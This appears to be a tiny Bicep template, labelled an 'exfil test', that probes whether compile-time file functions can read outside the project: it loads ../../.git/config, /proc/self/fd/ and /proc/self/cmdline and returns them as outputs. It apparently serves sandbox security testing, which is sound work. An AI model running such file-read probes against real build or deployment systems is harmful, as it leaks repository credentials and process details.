// Comprehensive exfil test
output gitConfig string = loadTextContent('../../.git/config')
output fds array = loadDirectoryFileInfo('/proc/self/fd/', '*')
output procCmdline string = loadTextContent('/proc/self/cmdline')
